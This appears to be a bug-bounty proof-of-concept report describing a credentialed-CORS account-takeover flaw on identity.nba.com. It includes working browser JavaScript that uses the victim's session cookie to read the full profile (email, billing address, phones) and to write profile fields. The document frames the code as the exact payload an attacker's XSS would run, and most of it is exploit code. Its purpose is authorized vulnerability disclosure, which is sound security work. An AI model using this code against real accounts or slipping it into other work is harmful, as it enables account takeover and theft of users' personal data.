NBA — identity.nba.com credentialed-CORS account-takeover primitive

Authorized bug-bounty PoC · HackerOne program nba-public (Gold-Standard Safe Harbor) · researcher handle sshabib · run against your OWN test account only. Read-only markers + one reversible write. No credential/password/OTP flows are touched.

What this proves. Any JavaScript that executes on a CORS-trusted NBA origin (www.nba.com, id.nba.com, www.wnba.com, watch.nba.com) can fully read and write the logged-in user's account on identity.nba.com/api/v1/profile — using the browser's ambient session cookie. The session cookie (nbaidentity) is HttpOnly, but that is irrelevant: the exploit never reads the token, it simply issues credentialed requests that the browser authenticates automatically. There is no CSRF token and no Authorization header on these requests — the x-client-id is a public constant shipped in the site's own JavaScript.

The primitive (paste into the DevTools console on https://www.nba.com while logged in)

This is the exact code an attacker's XSS payload would run once it has script execution on a trusted origin. It (1) reads the full profile, (2) flips one benign field and confirms the write, then (3) restores it. It prints a non-sensitive summary only.

// === NBA ATO primitive — READ + one reversible WRITE (own account only) ===
const BASE = "https://identity.nba.com/api/v1/profile?entitlements=true";
const H = {"content-type":"application/json",
           "x-client-platform":"web",
           "x-client-id":"Ohp2l3Awgo1QfOWqlvxqcW-tw7i4EvdEQatAQTTjMTs"}; // public, from the site's JS

async function read(){
  const r = await fetch(BASE,{credentials:"include",headers:H});
  return (await r.json()).data.result;
}
async function write(partial){
  const r = await fetch(BASE,{method:"PUT",credentials:"include",
              headers:H,body:JSON.stringify(partial)});
  return (await r.json()).status;
}

(async () => {
  const before = await read();
  // READ proof — field NAMES only, never print PII values:
  console.log("[READ] fields:", Object.keys(before));
  console.log("[READ] sensitive fields present:",
      ["email","billingAddress","primaryPhone","secondaryPhone","personalDetails"]
      .filter(k => before[k] != null));

  // WRITE proof — toggle a visible field, confirm, then restore exactly:
  const orig = before.givenName;
  console.log("[WRITE] givenName was:", orig);
  console.log("[WRITE] set 'PoCByAttacker' ->", await write({givenName:"PoCByAttacker"}));
  console.log("[WRITE] server now:", (await read()).givenName);
  console.log("[WRITE] restore ->", await write({givenName: orig}));
  console.log("[DONE] account restored. Attacker had full read+write as the victim.");
})();
